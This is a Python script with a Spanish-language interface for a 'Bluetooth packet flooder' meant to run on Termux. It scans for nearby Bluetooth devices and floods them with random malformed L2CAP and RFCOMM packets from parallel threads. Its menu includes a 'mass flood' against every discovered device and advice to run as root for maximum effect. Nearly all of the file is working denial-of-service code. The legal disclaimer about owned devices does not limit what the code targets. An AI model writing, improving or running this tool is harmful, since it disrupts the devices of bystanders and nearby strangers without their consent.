#!/usr/bin/env python3
"""
BLUETOOTH PACKET FLOODER - HERRAMIENTA REAL
USO EXCLUSIVO PARA PRUEBAS EN DISPOSITIVOS PROPIOS
"""

import bluetooth
import socket
import struct
import time
import random
import threading
import sys
import os
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich import box

console = Console()

class BluetoothFlooder:
    def __init__(self):
        self.running = False
        self.threads = []
        self.stats = {
            'packets_sent': 0,
            'devices_found': 0,
            'errors': 0,
            'start_time': time.time()
        }
        self.targets = []
        
    def discover_devices(self, duration=8):
        """Descubre dispositivos Bluetooth reales"""
        console.print(f"[cyan]🔍 Escaneando dispositivos por {duration} segundos...[/cyan]")
        try:
            devices = bluetooth.discover_devices(duration=duration, lookup_names=True, flush_cache=True)
            self.targets = []
            for addr, name in devices:
                self.targets.append({
                    'mac': addr,
                    'name': name if name else 'Desconocido',
                    'active': True
                })
            self.stats['devices_found'] = len(devices)
            return devices
        except Exception as e:
            console.print(f"[red]Error en escaneo: {e}[/red]")
            return []
    
    def create_l2cap_packet(self):
        """Crea paquete L2CAP malformado"""
        packet = b''
        # Cabecera L2CAP básica
        packet += struct.pack('<H', random.randint(1, 1000))  # Length
        packet += struct.pack('<H', random.randint(1, 0xFFFF))  # CID
        # Datos aleatorios
        packet += os.urandom(random.randint(50, 200))
        return packet
    
    def create_rfcomm_packet(self):
        """Crea paquete RFCOMM falso"""
        packet = b'\x03'  # Address field
        packet += b'\xEF'  # Control field
        packet += b'\x00'  # Length
        packet += os.urandom(random.randint(30, 150))
        # Calcular FCS (simplificado)
        packet += b'\xFF'
        return packet
    
    def flood_device(self, target_mac, interface='hci0'):
        """Inunda un dispositivo específico con paquetes"""
        packets_per_second = 100  # AJUSTABLE
        packet_types = [self.create_l2cap_packet, self.create_rfcomm_packet]
        
        try:
            # Crear socket Bluetooth
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.settimeout(0.1)
            
            # Intentar conexión (para algunos ataques)
            try:
                sock.connect((target_mac, 0x1001))  # PSM SDP
            except:
                pass
            
            while self.running:
                for _ in range(packets_per_second):
                    try:
                        packet = random.choice(packet_types)()
                        sock.send(packet)
                        self.stats['packets_sent'] += 1
                        
                        # Alternar entre diferentes PSM/Canales
                        if random.random() > 0.7:
                            sock.close()
                            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                            sock.connect((target_mac, random.randint(1, 30)))
                        
                    except Exception as e:
                        self.stats['errors'] += 1
                        # Recrear socket si hay error
                        try:
                            sock.close()
                        except:
                            pass
                        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
                        sock.settimeout(0.1)
                
                time.sleep(0.01)  # Pequeña pausa
                
        except Exception as e:
            console.print(f"[red]Error con {target_mac}: {e}[/red]")
        finally:
            try:
                sock.close()
            except:
                pass
    
    def start_flood(self, target_count=3):
        """Inicia el flood contra múltiples dispositivos"""
        if not self.targets:
            console.print("[yellow]⚠  No hay dispositivos objetivo. Escaneando primero...[/yellow]")
            self.discover_devices(5)
        
        self.running = True
        self.threads = []
        
        # Seleccionar objetivos
        selected_targets = self.targets[:min(target_count, len(self.targets))]
        
        console.print(f"[red]🚀 Iniciando flood contra {len(selected_targets)} dispositivos[/red]")
        
        for target in selected_targets:
            thread = threading.Thread(target=self.flood_device, args=(target['mac'],))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
            console.print(f"[yellow]▶  Objetivo: {target['name']} ({target['mac']})[/yellow]")
        
        return len(selected_targets)
    
    def stop_flood(self):
        """Detiene el flood"""
        self.running = False
        for thread in self.threads:
            thread.join(timeout=1)
        console.print("[green]✅ Flood detenido[/green]")
    
    def get_stats(self):
        """Obtiene estadísticas en tiempo real"""
        elapsed = time.time() - self.stats['start_time']
        return {
            'Tiempo': f"{int(elapsed)}s",
            'Paquetes': self.stats['packets_sent'],
            'Paquetes/s': int(self.stats['packets_sent'] / elapsed) if elapsed > 0 else 0,
            'Objetivos': len(self.targets),
            'Errores': self.stats['errors']
        }

def show_banner():
    banner = """
    ╔══════════════════════════════════════════════════════════╗
    ║  [bold red]██████╗ ██╗     ██╗   ██╗███████╗████████╗ ██████╗  ██████╗ ██╗  ██╗[/bold red]  ║
    ║  [bold red]██╔══██╗██║     ██║   ██║██╔════╝╚══██╔══╝██╔═══██╗██╔═══██╗██║ ██╔╝[/bold red]  ║
    ║  [bold red]██████╔╝██║     ██║   ██║█████╗     ██║   ██║   ██║██║   ██║█████╔╝ [/bold red]  ║
    ║  [bold red]██╔══██╗██║     ██║   ██║██╔══╝     ██║   ██║   ██║██║   ██║██╔═██╗ [/bold red]  ║
    ║  [bold red]██████╔╝███████╗╚██████╔╝███████╗   ██║   ╚██████╔╝╚██████╔╝██║  ██╗[/bold red]  ║
    ║  [bold red]╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝[/bold red]  ║
    ║                                                          ║
    ║              [bold cyan]BLUETOOTH PACKET FLOODER v4.0[/bold cyan]                 ║
    ║                [italic yellow]TERMUX - VERSIÓN FUNCIONAL[/italic yellow]                ║
    ╚══════════════════════════════════════════════════════════╝
    """
    console.print(banner)

def main_menu():
    flooder = BluetoothFlooder()
    
    while True:
        os.system('clear')
        show_banner()
        
        # Panel de estadísticas
        stats = flooder.get_stats()
        stats_table = Table(box=box.HEAVY, show_header=False)
        stats_table.add_column("Métrica", style="cyan")
        stats_table.add_column("Valor", style="green")
        
        for key, value in stats.items():
            stats_table.add_row(key, str(value))
        
        stats_panel = Panel(
            stats_table,
            title="[bold magenta]📊 ESTADÍSTICAS EN TIEMPO REAL[/bold magenta]",
            border_style="cyan"
        )
        
        # Panel de dispositivos
        devices_table = Table(title="[bold yellow]📡 DISPOSITIVOS DETECTADOS[/bold yellow]", box=box.ROUNDED)
        devices_table.add_column("MAC", style="white")
        devices_table.add_column("Nombre", style="cyan")
        devices_table.add_column("Estado", style="green")
        
        for target in flooder.targets[:10]:  # Mostrar primeros 10
            status = "[red]ATACANDO[/red]" if flooder.running else "[yellow]DETECTADO[/yellow]"
            devices_table.add_row(target['mac'], target['name'], status)
        
        # Mostrar paneles
        console.print(stats_panel)
        console.print("\n")
        
        if flooder.targets:
            console.print(devices_table)
            console.print(f"\n[yellow]Total dispositivos: {len(flooder.targets)}[/yellow]")
        
        # Menú
        console.print("\n" + "═" * 60, style="bold white")
        menu = """
        [bold][1][/bold] 🔍 Escanear dispositivos Bluetooth
        [bold][2][/bold] 🚀 Iniciar flood (3 dispositivos)
        [bold][3][/bold] ⚡ Flood masivo (todos los dispositivos)
        [bold][4][/bold] ⏹  Detener flood
        [bold][5][/bold] 🎯 Seleccionar objetivos manualmente
        [bold][6][/bold] ❌ Salir
        """
        console.print(menu)
        console.print("═" * 60, style="bold white")
        
        choice = input("\n[?] Selección: ").strip()
        
        if choice == "1":
            console.print("\n[cyan]Escaneando...[/cyan]")
            devices = flooder.discover_devices(10)
            console.print(f"[green]✅ Encontrados {len(devices)} dispositivos[/green]")
            time.sleep(2)
            
        elif choice == "2":
            if flooder.running:
                console.print("[yellow]⚠  El flood ya está en ejecución[/yellow]")
            else:
                targets = flooder.start_flood(3)
                console.print(f"[red]⚡ Flood iniciado contra {targets} objetivos[/red]")
                console.print("[yellow]Presiona Enter en el menú principal para detener[/yellow]")
            time.sleep(2)
            
        elif choice == "3":
            if flooder.running:
                console.print("[yellow]⚠  El flood ya está en ejecución[/yellow]")
            else:
                targets = flooder.start_flood(len(flooder.targets))
                console.print(f"[red]☢  FLOOD MASIVO iniciado contra {targets} objetivos[/red]")
            time.sleep(2)
            
        elif choice == "4":
            if flooder.running:
                flooder.stop_flood()
            else:
                console.print("[yellow]⚠  No hay flood en ejecución[/yellow]")
            time.sleep(2)
            
        elif choice == "5":
            if flooder.targets:
                console.print("\n[cyan]Dispositivos disponibles:[/cyan]")
                for i, target in enumerate(flooder.targets[:10], 1):
                    console.print(f"[{i}] {target['mac']} - {target['name']}")
                
                try:
                    selection = input("\nNúmeros separados por comas (ej: 1,3,5): ")
                    indices = [int(x.strip())-1 for x in selection.split(',')]
                    
                    # Crear nueva lista de objetivos seleccionados
                    selected = [flooder.targets[i] for i in indices if i < len(flooder.targets)]
                    
                    if selected and not flooder.running:
                        flooder.targets = selected
                        flooder.start_flood(len(selected))
                        console.print(f"[red]🎯 Flood iniciado contra {len(selected)} objetivos seleccionados[/red]")
                except:
                    console.print("[red]❌ Selección inválida[/red]")
            else:
                console.print("[yellow]⚠  Primero escanea dispositivos[/yellow]")
            time.sleep(3)
            
        elif choice == "6":
            if flooder.running:
                flooder.stop_flood()
            console.print("\n[bold green]👋 Saliendo...[/bold green]")
            break
            
        else:
            console.print("[red]❌ Opción inválida[/red]")
            time.sleep(1)

if __name__ == "__main__":
    try:
        # Verificar permisos
        if os.geteuid() != 0:
            console.print("[red]⚠  ADVERTENCIA: Se recomienda ejecutar como root para máximo efecto[/red]")
            console.print("[yellow]   Usa 'tsu' o 'sudo' si tu dispositivo está rooteado[/yellow]")
            time.sleep(2)
        
        # Advertencia legal
        warning = Panel(
            "[bold red]⚠  ADVERTENCIA LEGAL IMPORTANTE ⚠[/bold red]\n\n"
            "Esta herramienta es para pruebas en dispositivos DE TU PROPIEDAD.\n"
            "Interferir con redes Bluetooth ajenas es ILEGAL en la mayoría de países.\n"
            "Eres responsable del uso que hagas de este software.\n\n"
            "[yellow]Presiona Enter para continuar (aceptas la responsabilidad)...[/yellow]",
            title="[bold]ACUERDO DE USO RESPONSABLE[/bold]",
            border_style="red",
            box=box.DOUBLE
        )
        console.print(warning)
        input()
        
        main_menu()
        
    except KeyboardInterrupt:
        console.print("\n\n[yellow]⚠  Interrumpido por el usuario[/yellow]")
    except Exception as e:
        console.print(f"\n[red]❌ Error crítico: {e}[/red]")
        console.print("[yellow]¿Instalaste todas las dependencias?[/yellow]")

